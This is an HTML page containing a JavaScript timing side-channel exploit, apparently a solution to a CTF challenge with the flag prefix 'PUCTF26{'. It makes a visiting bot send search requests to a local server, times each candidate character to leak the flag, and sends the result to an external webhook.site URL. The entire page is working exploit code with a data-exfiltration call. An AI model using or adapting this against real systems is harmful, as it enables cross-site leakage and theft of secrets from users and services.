<!DOCTYPE html>
<html>
<body>
<script>
// 1. Replace this with your webhook.site URL
const webhook = "https://webhook.site/YOUR_UNIQUE_ID_HERE";

// The bot is attacking its own local server
const target = "http://localhost:5000/search?flag=";

// The characters allowed in the flag format
const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}".split("");

// Start with the known prefix
let known = "PUCTF26{"; 

async function measure(guess) {
    const start = performance.now();
    try {
        await fetch(target + guess, { mode: 'no-cors', cache: 'no-store' });
    } catch(e) {}
    return performance.now() - start;
}

async function leakNextCharacter() {
    let bestChar = '';
    let lowestTime = Infinity;

    // Loop through every possible character
    for (let char of charset) {
        let guess = known + char;
        let time = await measure(guess);
        
        // If this character was faster than our current record, update it!
        if (time < lowestTime) {
            lowestTime = time;
            bestChar = char;
        }
        
        // A tiny delay to keep the network requests stable
        await new Promise(r => setTimeout(r, 50));
    }

    // After checking all characters, send ONLY the winner to your webhook
    let updatedFlag = known + bestChar;
    fetch(`${webhook}?winner=${bestChar}&new_known=${updatedFlag}&time=${lowestTime}`, {mode: 'no-cors'});
}

leakNextCharacter();
</script>
</body>
</html>
